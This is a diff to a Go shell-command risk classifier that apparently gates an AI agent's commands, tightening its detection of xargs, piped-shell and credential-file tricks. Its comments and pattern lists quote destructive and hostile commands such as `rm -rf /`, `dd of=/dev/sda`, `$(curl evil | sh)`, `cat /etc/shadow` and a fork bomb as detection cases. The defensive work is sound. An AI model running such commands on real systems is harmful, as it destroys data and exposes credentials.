@@ -38,11 +38,14 @@
 //     &&, ||), each segment into pipe stages (on |), and EVERY stage is
 //     classified — not just the head — so `true | dd of=/dev/sda` and
 //     `echo x | sudo rm -rf /home` are seen for what their later stages do.
-//     A stage that pipes INTO xargs running a destructive/system verb has its
-//     upstream literal payload (echo/printf args) composed onto the inner
-//     command (`echo "/" | xargs rm -rf` classifies like `rm -rf /`); when
-//     the payload is not statically determinable the pipeline fails closed
-//     (unknown → deny). The worst class across all parts wins (see rank).
+//     A stage that pipes INTO an argv composer (xargs / GNU parallel / xe)
+//     running a destructive/system verb has its upstream literal payload
+//     (echo/printf args) composed onto the inner command (`echo "/" | xargs
+//     rm -rf` classifies like `rm -rf /`); when the payload is not statically
+//     determinable the pipeline fails closed (unknown → deny). A stage that
+//     pipes INTO a shell similarly composes a static payload (`echo rm -rf /
+//     | sh` classifies like `rm -rf /`) so the real effect, not just
+//     code_execution, wins. The worst class across all parts wins (see rank).
 //
 //  3. Wrapper unwrapping (unwrapWrappers). Leading execution wrappers
 //     (env, xargs, nohup, nice, setsid, timeout, …) are stripped so the
@@ -198,6 +201,13 @@ func ClassifyPath(path string) RiskClass {
 		return SystemWrite
 	}
 
+	// Character pseudo-devices used as discards or stdio aliases are not
+	// raw disks. Classifying every /dev path as Destructive made
+	// `echo x > /dev/null` and `dd of=/dev/stdout` prompt as system_write.
+	if isBenignCharDevice(abs) {
+		return LocalWrite
+	}
+
 	for _, prefix := range []string{"/boot", "/dev", "/proc", "/sys", "/mnt", "/media"} {
 		if strings.HasPrefix(abs, prefix) {
 			return Destructive
@@ -254,6 +264,20 @@ func ClassifyPath(path string) RiskClass {
 		}
 	}
 	return LocalWrite
+}
+
+// isBenignCharDevice reports whether abs is a character pseudo-device used
+// as a discard or stdio alias, not a raw block device. Writes here are
+// local_write (or fall through to Safe for display/dd idioms), never
+// Destructive via the /dev prefix.
+func isBenignCharDevice(abs string) bool {
+	switch abs {
+	case "/dev/null", "/dev/zero", "/dev/full",
+		"/dev/stdout", "/dev/stderr", "/dev/stdin",
+		"/dev/tty":
+		return true
+	}
+	return strings.HasPrefix(abs, "/dev/fd/")
 }
 
 // shellRCFiles are dotfiles in $HOME that shells execute automatically on
@@ -942,7 +966,7 @@ func tokenize(input string) []string {
 		// forms) stay single tokens so they are not mistaken for separators.
 		if i+2 < len(input) {
 			switch op3 := input[i : i+3]; op3 {
-			case ">>&", "&>>":
+			case ">>&", "&>>", "<<<":
 				flush()
 				tokens = append(tokens, op3)
 				i += 2
@@ -952,7 +976,7 @@ func tokenize(input string) []string {
 		if i+1 < len(input) {
 			op2 := string(input[i]) + string(input[i+1])
 			switch op2 {
-			case "&&", "||", ">>", ">&", "&>", "|&":
+			case "&&", "||", ">>", ">&", "&>", "|&", "<<":
 				flush()
 				tokens = append(tokens, op2)
 				i++
@@ -960,9 +984,12 @@ func tokenize(input string) []string {
 			}
 		}
 
-		// Single-char operators: |, >, ;, &
+		// Single-char operators: |, >, ;, &, <
+		// `<` must be an operator so here-strings and file redirects
+		// (`xargs rm -rf <<</`, `xargs rm -rf < paths`) are not glued
+		// onto the following path as a single non-wipe token.
 		switch ch {
-		case '|', '>', ';', '&':
+		case '|', '>', ';', '&', '<':
 			flush()
 			tokens = append(tokens, string(ch))
 			continue
@@ -981,7 +1008,11 @@ func tokenize(input string) []string {
 // documentation of what's considered read-only.)
 
 var writePrefixes = map[string]bool{
-	"echo": true, "sed": true, "tee": true,
+	// echo is deliberately absent: without a redirect it only prints, and
+	// treating its operands as write targets made `echo /etc/passwd` and
+	// `echo rm -rf / | sh` escalate as system_write. Redirected echo is
+	// still a write via isLocalWrite / the redirect scan in isSystemWrite.
+	"sed": true, "tee": true,
 	"rm": true, "mv": true, "cp": true, "touch": true,
 	"mkdir": true, "rmdir": true, "chmod": true, "chown": true,
 	// chattr mutates file attributes (including the immutable flag) the same
@@ -993,6 +1024,20 @@ var writePrefixes = map[string]bool{
 	// destructive when aimed at a block device or catastrophic wipe target;
 	// otherwise a local-file shred is a write (local_write / system_write).
 	"shred": true,
+}
+
+// displayVerbs only print their operands. Path-shaped arguments are not
+// opened unless there is an output redirect, so resource/system-path
+// scans skip them (`echo /etc/passwd`, `printf ~/.ssh/id_rsa`).
+var displayVerbs = map[string]bool{
+	"echo": true, "printf": true,
+}
+
+// projectExecCommands run project-defined recipes/tests (Makefiles,
+// pytest) and are code_execution — the same class as `npm test` — rather
+// than unknown (deny). They must NOT be added to safeCommands.
+var projectExecCommands = map[string]bool{
+	"make": true, "gmake": true, "pytest": true, "py.test": true,
 }
 
 var systemPrefixes = map[string]bool{
@@ -1032,6 +1077,7 @@ var networkPrefixes = map[string]bool{
 
 var pipedShells = map[string]bool{
 	"sh": true, "bash": true, "zsh": true, "fish": true, "dash": true, "ksh": true,
+	"ash": true,
 }
 
 // embeddedShellInterpreters are programs whose payload (script, expression,
@@ -1058,6 +1104,13 @@ var codeEvalPrefixes = map[string]bool{
 var stdinExecInterpreters = map[string]bool{
 	"node": true, "python": true, "python3": true,
 	"perl": true, "ruby": true, "php": true,
+	// Runtime CLIs that execute a program from stdin when fed a pipe.
+	// bun was previously only an install/run prefix, so `cat pwn.js | bun`
+	// classified Safe (auto-allow).
+	"bun": true, "deno": true,
+	"lua": true, "luajit": true,
+	"osascript": true,
+	"ipython":   true,
 }
 
 // remoteRunPrefixes fetch and execute a (possibly remote) package or script
@@ -1115,7 +1168,7 @@ var safeCommands = map[string]bool{
 	"jq": true, "yq": true, "xmllint": true, "csvlook": true,
 	// hashing / encoding (read-only inspection)
 	"strings": true, "od": true, "hexdump": true, "xxd": true,
-	"base32": true, "md5sum": true, "sha1sum": true, "sha256sum": true,
+	"base32": true, "base64": true, "md5sum": true, "sha1sum": true, "sha256sum": true,
 	"sha512sum": true, "cksum": true, "b2sum": true, "sum": true, "shasum": true,
 	// system / process inspection
 	"pwd": true, "printf": true, "date": true, "cal": true, "uptime": true,
@@ -1139,6 +1192,9 @@ var safeCommands = map[string]bool{
 	"local": true, "declare": true, "typeset": true, "readonly": true,
 	"alias": true, "unalias": true, "jobs": true, "bg": true, "fg": true,
 	"disown": true, "let": true, "ulimit": true, "times": true,
+	// crontab listing/help is Safe; isPersistenceWrite escalates installs
+	// (`crontab file`, `crontab -`) before this set is consulted.
+	"crontab": true,
 	// common modern read-only CLIs (ls/find/cat/ps/df/du/diff/hex viewers)
 	"fd": true, "fdfind": true, "eza": true, "exa": true, "lsd": true,
 	"htop": true, "btop": true, "glances": true, "pstree": true, "procs": true,
@@ -1222,19 +1278,31 @@ func classifyPipeline(tokens []string) RiskClass {
 		// idx > 0 means this stage receives piped input from the previous one.
 		worst = worstOf(worst, classifyStage(stage, idx > 0))
 		if idx > 0 {
-			// A pipe-fed xargs turns upstream stdout into command arguments,
-			// so `echo "/" | xargs rm -rf` executes `rm -rf /` even though no
-			// stage literally contains that command. Compose the payload.
-			worst = worstOf(worst, classifyXargsSink(stages[:idx], stage))
+			// A pipe-fed argv composer turns upstream stdout into command
+			// arguments, so `echo "/" | xargs rm -rf` executes `rm -rf /`
+			// even though no stage literally contains that command.
+			worst = worstOf(worst, classifyArgvComposerSink(stages[:idx], stage))
+			// A pipe-fed shell executes its stdin as a script. When that
+			// stdin is a static literal, classify the payload as a command
+			// so `echo rm -rf / | sh` is destructive, not merely
+			// code_execution (prompt).
+			worst = worstOf(worst, classifyPipedShellSink(stages[:idx], stage))
 		}
+	}
+	// File-fed xargs (`xargs -a paths rm -rf`, `xargs rm -rf < file`) is
+	// the no-pipe analogue of `cat file | xargs rm -rf`: the real argv is
+	// not on the command line, so a dangerous inner verb fails closed.
+	if len(stages) == 1 {
+		worst = worstOf(worst, classifyXargsFileInput(stages[0]))
 	}
 	return worst
 }
 
-// classifyXargsSink handles a pipe stage whose command is reached through an
-// xargs wrapper while receiving piped stdin. xargs appends each line of stdin
-// to the inner command line, so the effective command is `inner <payload>…`
-// even though the payload never appears as a token of the sink stage.
+// classifyArgvComposerSink handles a pipe stage whose command is reached
+// through an argv composer (xargs / GNU parallel / xe) while receiving
+// piped stdin. The composer appends each line of stdin to the inner command
+// line, so the effective command is `inner <payload>…` even though the
+// payload never appears as a token of the sink stage.
 //
 // When the upstream pipeline is a statically determinable literal producer
 // (`echo <args>` / `printf <args>`) the payload tokens are composed onto the
@@ -1245,8 +1313,8 @@ func classifyPipeline(tokens []string) RiskClass {
 // damage, the pipeline fails closed as Unknown (deny-by-default): the same
 // treatment an unrecognised verb gets, because the command that will actually
 // run is unknowable at classification time.
-func classifyXargsSink(upstream [][]string, stage []string) RiskClass {
-	inner, ok := xargsInnerCommand(stage)
+func classifyArgvComposerSink(upstream [][]string, stage []string) RiskClass {
+	inner, ok := argvComposerInnerCommand(stage)
 	if !ok || len(inner) == 0 {
 		return Safe
 	}
@@ -1262,18 +1330,91 @@ func classifyXargsSink(upstream [][]string, stage []string) RiskClass {
 	return Safe
 }
 
-// xargsInnerCommand returns the tokens of the command an xargs wrapper in the
-// stage's leading wrapper chain will execute (everything after xargs and its
-// options). ok reports whether such an xargs wrapper was found; a bare xargs
-// (default command is echo) yields an empty inner slice with ok=true.
-func xargsInnerCommand(tokens []string) (inner []string, ok bool) {
+// classifyPipedShellSink composes a statically determinable upstream
+// payload onto a pipe-fed shell and classifies it as a command. Dynamic
+// payloads stay at the CodeExecution floor already set by classifyStage.
+// Unknown compositions are ignored so `echo hi | bash` does not degrade
+// from code_execution (prompt) to unknown (deny).
+func classifyPipedShellSink(upstream [][]string, stage []string) RiskClass {
+	cmdTokens, _ := unwrapWrappers(stage)
+	if len(cmdTokens) == 0 {
+		return Safe
+	}
+	if !pipedShells[commandName(cmdTokens[0])] {
+		return Safe
+	}
+	payload, static := staticPipePayload(upstream)
+	if !static || len(payload) == 0 {
+		return Safe
+	}
+	cls := Classify(strings.Join(payload, " "))
+	if cls == Unknown {
+		return Safe
+	}
+	return cls
+}
+
+// classifyXargsFileInput fails closed when a (non-pipe) xargs invocation
+// reads its argv from a file or input redirect. `xargs -a paths rm -rf`
+// and `xargs rm -rf < paths` execute whatever paths the file contains;
+// like `cat paths | xargs rm -rf` that is Unknown when the inner verb is
+// dangerous. A here-string (`<<< /`) already puts the payload on the
+// command line, so it is not treated as an external source.
+func classifyXargsFileInput(stage []string) RiskClass {
+	inner, ok := argvComposerInnerCommand(stage)
+	if !ok || len(inner) == 0 {
+		return Safe
+	}
+	if !xargsHasExternalArgSource(stage) {
+		return Safe
+	}
+	if xargsDangerousVerb(commandName(inner[0])) {
+		return Unknown
+	}
+	return Safe
+}
+
+func xargsHasExternalArgSource(tokens []string) bool {
+	for _, t := range tokens {
+		if t == "-a" || strings.HasPrefix(t, "--arg-file") {
+			return true
+		}
+		// Fused short form: -apaths / -a/tmp/paths (but not --anything).
+		if strings.HasPrefix(t, "-a") && !strings.HasPrefix(t, "--") && t != "-a" {
+			return true
+		}
+		// Input redirect of a file. Here-strings (`<<<`) carry their
+		// payload as a later token and are not external sources.
+		if t == "<" || t == "<<" {
+			return true
+		}
+		if strings.HasPrefix(t, "<") && !strings.HasPrefix(t, "<<<") {
+			return true
+		}
+	}
+	return false
+}
+
+// argvComposers turn stdin (or -a/--arg-file) lines into extra argv for
+// an inner command. They share the xargs composition / fail-closed path.
+var argvComposers = map[string]bool{
+	"xargs":    true,
+	"parallel": true,
+	"xe":       true,
+}
+
+// argvComposerInnerCommand returns the tokens of the command an argv
+// composer in the stage's leading wrapper chain will execute. ok reports
+// whether such a composer was found; a bare xargs (default command is
+// echo) yields an empty inner slice with ok=true.
+func argvComposerInnerCommand(tokens []string) (inner []string, ok bool) {
 	i := 0
 	for i < len(tokens) && isAssignment(tokens[i]) {
 		i++ // leading VAR=value assignment prefix
 	}
 	for i < len(tokens) {
 		name := commandName(tokens[i])
-		if name == "xargs" {
+		if argvComposers[name] {
 			i++
 			for i < len(tokens) {
 				t := tokens[i]
@@ -1282,6 +1423,9 @@ func xargsInnerCommand(tokens []string) (inner []string, ok bool) {
 				}
 				// Option flags. Value-taking flags consume the next token so
 				// the value is not mistaken for the inner command.
+				// `--replace` without `=` does NOT take a value (`xargs
+				// --replace rm` means replace-str defaults to `{}` and `rm`
+				// is the command); `--replace=foo` is a single token.
 				if xargsValueFlags[t] && i+1 < len(tokens) {
 					i += 2
 					continue
@@ -1317,10 +1461,16 @@ func xargsInnerCommand(tokens []string) (inner []string, ok bool) {
 // a single token and are skipped like any other flag.
 var xargsValueFlags = map[string]bool{
 	"-I": true, "-L": true, "-n": true, "-P": true, "-s": true,
-	"-E": true, "-e": true, "-d": true, "-a": true,
-	"--replace": true, "--max-lines": true, "--max-args": true,
-	"--max-procs": true, "--max-chars": true, "--eof": true,
+	"-E": true, "-d": true, "-a": true,
+	"--max-lines": true, "--max-args": true,
+	"--max-procs": true, "--max-chars": true,
 	"--delimiter": true, "--arg-file": true,
+	// GNU `--replace` / `--eof` / `-e` take an *optional* value.
+	// Only the `--flag=value` spelling carries it in-token; treating
+	// the bare form as value-taking swallowed the inner verb
+	// (`xargs --eof rm` → empty inner → local_write allow).
+	// GNU parallel value-taking flags (union with xargs).
+	"-j": true, "--jobs": true, "-N": true,
 }
 
 // staticPipePayload returns the literal tokens an upstream pipeline feeds
@@ -1336,6 +1486,11 @@ func staticPipePayload(upstream [][]string) (payload []string, ok bool) {
 	stage := upstream[0]
 	if len(stage) == 0 {
 		return nil, false
+	}
+	// `env echo / | xargs rm` and `command echo / | xargs rm` are the
+	// same static producer as bare echo once wrappers are stripped.
+	if unwrapped, _ := unwrapWrappers(stage); len(unwrapped) > 0 {
+		stage = unwrapped
 	}
 	var args []string
 	switch commandName(stage[0]) {
@@ -1418,7 +1573,7 @@ func classifyStage(tokens []string, pipedInto bool) RiskClass {
 		// `… | perl`, `… | node`, `… | awk -f -`. This is the non-shell analogue
 		// of the `… | bash` case above and is equally code execution — without
 		// it the stage would be classified only by the (network/safe) producer.
-		if pipedInto && (stdinExecInterpreters[name] || embeddedShellInterpreters[name]) {
+		if pipedInto && (isStdinExecInterpreter(name) || embeddedShellInterpreters[name]) {
 			cls = worstOf(cls, CodeExecution)
 		}
 		// find … -exec/-execdir/-ok CMD runs an arbitrary command per match.
@@ -1427,11 +1582,50 @@ func classifyStage(tokens []string, pipedInto bool) RiskClass {
 		}
 	}
 	// Reverse-shell channels and sensitive resources can appear anywhere in
-	// the stage (including behind redirects we don't fully parse).
-	for _, t := range tokens {
+	// the stage (including behind redirects we don't fully parse). Display
+	// verbs without an output redirect only print their operands — scanning
+	// them as paths made `echo id_rsa` and `echo "see ~/.ssh docs"` prompt.
+	display := len(cmdTokens) > 0 && displayVerbs[commandName(cmdTokens[0])] && !stageHasOutputRedirect(tokens)
+	for i, t := range tokens {
+		if display {
+			if i > 0 && isRedirectToken(tokens[i-1]) {
+				cls = worstOf(cls, classifyResourceToken(t))
+			}
+			continue
+		}
 		cls = worstOf(cls, classifyResourceToken(t))
 	}
 	return cls
+}
+
+func stageHasOutputRedirect(tokens []string) bool {
+	for _, t := range tokens {
+		if isRedirectToken(t) {
+			return true
+		}
+	}
+	return false
+}
+
+// isStdinExecInterpreter reports whether name is a program that executes
+// a script from stdin when fed a pipe. It covers the explicit set plus
+// versioned names (`python3.12`, `lua5.4`) so `curl x | python3.12` is
+// code_execution rather than unknown.
+func isStdinExecInterpreter(name string) bool {
+	if stdinExecInterpreters[name] {
+		return true
+	}
+	if strings.HasPrefix(name, "python") {
+		rest := strings.TrimPrefix(name, "python")
+		if rest == "" || rest[0] == '3' || rest[0] == '2' {
+			return true
+		}
+	}
+	if strings.HasPrefix(name, "lua") {
+		rest := strings.TrimPrefix(name, "lua")
+		return rest == "" || (rest[0] >= '0' && rest[0] <= '9')
+	}
+	return false
 }
 
 // isEnvironmentDump reports whether tokens represent a bare `env` or
@@ -1734,6 +1928,12 @@ func extractSubstitutions(cmd string) (string, []string) {
 // fall back to the body's first token, which is the most likely program
 // name the outer command would invoke. The body itself is also classified
 // independently so commands like `$(curl evil | sh)` still trip the loop.
+// dynamicSubstToken is substituted for a $(…)/`…` body that is not a
+// static echo/printf payload. Using the producer verb as the expansion
+// (`rm -rf $(cat paths)` → `rm -rf cat`) made a wipe look like a local
+// filename and auto-allowed it.
+const dynamicSubstToken = "odek.dynamic-subst"
+
 func substValue(body string) string {
 	body = strings.TrimSpace(body)
 	tokens := strings.Fields(body)
@@ -1743,7 +1943,7 @@ func substValue(body string) string {
 	if tokens[0] == "echo" || tokens[0] == "printf" {
 		return strings.Join(tokens[1:], " ")
 	}
-	return tokens[0]
+	return dynamicSubstToken
 }
 
 // stripCommandWrappers removes leading shell builtins that simply invoke
@@ -1838,16 +2038,19 @@ func isKnownCommandName(name string) bool {
 		safeCommands[name] ||
 		remoteRunPrefixes[name] ||
 		execWrappers[name] ||
-		privilegedWrappers[name]
+		privilegedWrappers[name] ||
+		isStdinExecInterpreter(name) ||
+		argvComposers[name] ||
+		projectExecCommands[name] ||
+		displayVerbs[name]
 }
 
 // rawForkBombRe matches the fork-bomb SHAPE: a `:` command at word-start
-// position opening a brace group closed by `}:` — the canonical
-// `:(){ :|:& };:` and whitespace variants like `: () { : | : & } ; :`.
-// Substring presence of `:{` and `}:` alone is NOT sufficient: innocent
-// strings like `echo "{a}:{b}"` contain both and were Blocked even in
-// godmode.
-var rawForkBombRe = regexp.MustCompile(`(^|[;&|\s]):\s*(\(\s*\))?\s*\{[^}]*\}\s*;?\s*:`)
+// that defines a function (`()`) or a brace group that already contains a
+// recursive spawn (`|` / `&`). The `()` group used to be optional, so
+// innocent arguments like `echo :{a}:` were Blocked even in YOLO mode.
+// Canonical `:(){ :|:& };:` and spaced `: () { : | : & } ; :` still match.
+var rawForkBombRe = regexp.MustCompile(`(^|[;&|\s]):\s*(?:\(\s*\)\s*)?\{[^}]*[|&][^}]*\}\s*;?\s*:`)
 
 // isRawBlocked checks the raw command string for patterns that are
 // blocked regardless of tokenization artifacts.
@@ -1931,6 +2134,8 @@ var execWrappers = map[string]bool{
 	"env": true, "xargs": true, "nohup": true, "nice": true, "ionice": true,
 	"setsid": true, "stdbuf": true, "time": true, "timeout": true,
 	"command": true, "exec": true, "builtin": true, "watch": true,
+	"busybox": true, "unbuffer": true,
+	"parallel": true, "xe": true,
 }
 
 // unwrapWrappers strips leading shell assignments and execution wrappers and
@@ -1969,8 +2174,18 @@ func unwrapWrappers(tokens []string) ([]string, RiskClass) {
 		for i < len(tokens) {
 			t := tokens[i]
 			switch {
+			case t == "--":
+				i++
+				goto nextWrapper
 			case strings.HasPrefix(t, "-") && t != "-":
-				i++ // wrapper option flag
+				// Value-taking flags (xargs -I P, timeout --signal X)
+				// must consume the next token so it is not mistaken for
+				// the inner command (`xargs -I P echo P` is echo, not P).
+				if argvComposers[name] && xargsValueFlags[t] && i+1 < len(tokens) {
+					i += 2
+					continue
+				}
+				i++
 			case name == "env" && isAssignment(t):
 				envAssignments = append(envAssignments, t)
 				i++ // env VAR=VALUE
@@ -1986,6 +2201,15 @@ func unwrapWrappers(tokens []string) ([]string, RiskClass) {
 		floor = worstOf(floor, envAssignmentRisk(envAssignments))
 	}
 	return tokens[i:], floor
+}
+
+func hasDynamicSubst(tokens []string) bool {
+	for _, t := range tokens {
+		if t == dynamicSubstToken {
+			return true
+		}
+	}
+	return false
 }
 
 // envExecNames are assignment names that turn the wrapped command into
@@ -2085,13 +2309,77 @@ var sensitivePathFragments = []string{
 }
 
 func isSensitivePath(tok string) bool {
-	t := strings.TrimPrefix(strings.ToLower(tok), "~")
+	t := strings.ToLower(tok)
+	for _, prefix := range []string{"of=", "if="} {
+		if strings.HasPrefix(t, prefix) {
+			t = t[len(prefix):]
+			break
+		}
+	}
 	for _, frag := range sensitivePathFragments {
-		if strings.Contains(t, frag) {
+		if sensitiveFragmentMatch(t, frag) {
 			return true
 		}
 	}
 	return false
+}
+
+// sensitiveFragmentMatch requires path-shaped context so bare words and
+// prose do not trip credential fragments: `echo id_rsa` and
+// `echo "see ~/.ssh docs"` are Safe, while `cat ~/.ssh/id_rsa` and
+// `cat /etc/shadow` still match.
+func sensitiveFragmentMatch(tok, frag string) bool {
+	if frag == "/environ" {
+		// `/environ` as a raw substring matches "set /environ var".
+		// Only /proc/…/environ is a credential file.
+		return strings.Contains(tok, "/proc/") && strings.Contains(tok, "/environ")
+	}
+	if !strings.Contains(tok, frag) {
+		return false
+	}
+	if strings.HasPrefix(frag, "/") {
+		return pathBoundedContains(tok, frag)
+	}
+	// Basename fragments (id_rsa, …): must be a path component, not a
+	// substring of an unrelated word (`my_id_rsa_backup`) and not a
+	// bare search pattern (`grep id_rsa README`).
+	return pathComponentEquals(tok, frag)
+}
+
+func pathBoundedContains(tok, frag string) bool {
+	for idx := 0; idx <= len(tok); {
+		i := strings.Index(tok[idx:], frag)
+		if i < 0 {
+			return false
+		}
+		i += idx
+		after := i + len(frag)
+		afterOK := after == len(tok) || tok[after] == '/' || tok[after] == '.'
+		if afterOK {
+			return true
+		}
+		idx = i + 1
+	}
+	return false
+}
+
+func pathComponentEquals(tok, frag string) bool {
+	// Require a path separator or ~ somewhere so `grep id_rsa README`
+	// (bare word) is not a credential path, while `~/.ssh/id_rsa` and
+	// `/home/x/.ssh/id_rsa` still match.
+	if !strings.ContainsAny(tok, "/~") {
+		return false
+	}
+	base := tok
+	if i := strings.LastIndexByte(tok, '/'); i >= 0 {
+		base = tok[i+1:]
+	}
+	if base == frag || strings.HasPrefix(base, frag+".") {
+		return true
+	}
+	// Also match the fragment as a complete component in the middle
+	// (`…/id_rsa/…` is unusual but fail-closed).
+	return strings.Contains(tok, "/"+frag+"/") || strings.HasSuffix(tok, "/"+frag)
 }
 
 // isSensitiveOdekPath reports whether tok names a ~/.odek trust anchor that
@@ -2137,6 +2425,13 @@ func expandShellTokenPath(tok string) string {
 		if strings.HasPrefix(strings.ToLower(path), prefix) {
 			path = path[len(prefix):]
 			break
+		}
+	}
+	// Fused fd redirects: `2>/dev/null` is a single token.
+	if i := strings.IndexByte(path, '>'); i >= 0 {
+		fd := path[:i]
+		if fd == "" || isAllDigits(fd) {
+			path = strings.TrimPrefix(path[i+1:], ">")
 		}
 	}
 	if path == "" {
@@ -2454,6 +2749,13 @@ func classifyCommand(tokens []string) RiskClass {
 		return Blocked
 	}
 
+	// A non-static $(…)/`…` expansion in a mutating command is the same
+	// threat as `cat file | xargs rm`: the real path is unknowable, so
+	// fail closed. Static `$(echo /)` is inlined by substValue first.
+	if hasDynamicSubst(tokens) && xargsDangerousVerb(first) {
+		return Unknown
+	}
+
 	// Destructive
 	if isDestructive(first, tokens) {
 		return Destructive
@@ -2505,7 +2807,12 @@ func classifyCommand(tokens []string) RiskClass {
 	// Any argument that names a system path (read or write) — broader than
 	// isSystemWrite's redirect-only check above, which runs earlier so a
 	// redirect to a system path beats the LocalWrite classification.
-	if touchesSystemPath(tokens) {
+	// Display verbs without a redirect only print the string; they do not
+	// open it (`echo /etc/passwd` is Safe, `cat /etc/shadow` is not).
+	if !displayVerbs[first] && touchesSystemPath(tokens) {
+		return SystemWrite
+	}
+	if displayVerbs[first] && stageHasOutputRedirect(tokens) && touchesSystemPath(tokens) {
 		return SystemWrite
 	}
 
@@ -2946,7 +3253,26 @@ func isNetworkEgress(first string, tokens []string) bool {
 		}
 		return false
 	}
+	// Help/version queries do not open a socket (`curl --help`, `wget
+	// --version`, `ssh -V`). Bare `curl` / `wget` still egress: they
+	// wait for a URL or fetch a default target.
+	if networkInfoQuery(tokens) {
+		return false
+	}
 	// All other network commands are inherently egress
+	return true
+}
+
+func networkInfoQuery(tokens []string) bool {
+	if len(tokens) < 2 {
+		return false
+	}
+	for _, t := range tokens[1:] {
+		if interpreterInfoFlags[t] {
+			continue
+		}
+		return false
+	}
 	return true
 }
 
@@ -3224,8 +3550,19 @@ func isCodeExecution(first string, tokens []string) bool {
 	// Embedded-shell interpreters: awk, ed/ex, vi/vim, emacs, etc. Their
 	// payload (script expression or file operand) can invoke arbitrary shell
 	// commands, so any non-trivial invocation is code execution.
+	// awk is narrower: only scripts that call system()/pipes or an
+	// uninspectable -f file escalate, so `awk '{print $1}' file` stays Safe.
+	if first == "awk" || first == "gawk" || first == "mawk" || first == "nawk" {
+		return awkRunsShellCode(tokens)
+	}
 	if embeddedShellInterpreters[first] && interpreterRunsCode(tokens) {
 		return true
+	}
+
+	// make / pytest run project-defined recipes — code_execution (prompt),
+	// not unknown (deny). Help/version queries stay non-executing.
+	if projectExecCommands[first] {
+		return interpreterRunsCode(tokens) || len(tokens) == 1
 	}
 
 	// sed's 'e' command and script files (-f/--file) execute shell code.
@@ -3299,6 +3636,90 @@ func interpreterRunsCode(tokens []string) bool {
 		return true
 	}
 	return false
+}
+
+func isAllDigits(s string) bool {
+	if s == "" {
+		return false
+	}
+	for _, r := range s {
+		if r < '0' || r > '9' {
+			return false
+		}
+	}
+	return true
+}
+
+// awkRunsShellCode reports whether an awk invocation will run shell
+// commands: an uninspectable script file (-f/--file), or an inline
+// script that calls system() or pipes to a command. Plain field
+// printing (`awk '{print $1}' file`) is not code execution.
+func awkRunsShellCode(tokens []string) bool {
+	skipNext := false
+	for i := 1; i < len(tokens); i++ {
+		if skipNext {
+			skipNext = false
+			continue
+		}
+		tok := tokens[i]
+		if tok == "-f" || tok == "--file" {
+			return true
+		}
+		if strings.HasPrefix(tok, "--file=") {
+			return true
+		}
+		if strings.HasPrefix(tok, "--source=") {
+			return awkScriptHasShellExec(tok[len("--source="):])
+		}
+		if tok == "-e" || tok == "--source" || tok == "--exec" {
+			if i+1 < len(tokens) && awkScriptHasShellExec(tokens[i+1]) {
+				return true
+			}
+			skipNext = true
+			continue
+		}
+		if tok == "-F" || tok == "-v" || tok == "-W" {
+			skipNext = true
+			continue
+		}
+		if isShortFlagToken(tok) {
+			rest := tok[1:]
+			for j := 0; j < len(rest); j++ {
+				switch rest[j] {
+				case 'f':
+					return true
+				case 'F', 'v':
+					j = len(rest)
+				case 'e':
+					if awkScriptHasShellExec(rest[j+1:]) {
+						return true
+					}
+					j = len(rest)
+				}
+			}
+			continue
+		}
+		if !strings.HasPrefix(tok, "-") && awkScriptHasShellExec(tok) {
+			return true
+		}
+	}
+	return false
+}
+
+func awkScriptHasShellExec(tok string) bool {
+	if len(tok) >= 2 {
+		if (tok[0] == '\'' && tok[len(tok)-1] == '\'') || (tok[0] == '"' && tok[len(tok)-1] == '"') {
+			tok = tok[1 : len(tok)-1]
+		}
+	}
+	if tok == "" {
+		return false
+	}
+	lower := strings.ToLower(tok)
+	if strings.Contains(lower, "system(") {
+		return true
+	}
+	return strings.Contains(tok, "|")
 }
 
 // sedRunsShellCode reports whether a sed invocation uses the 'e' command or
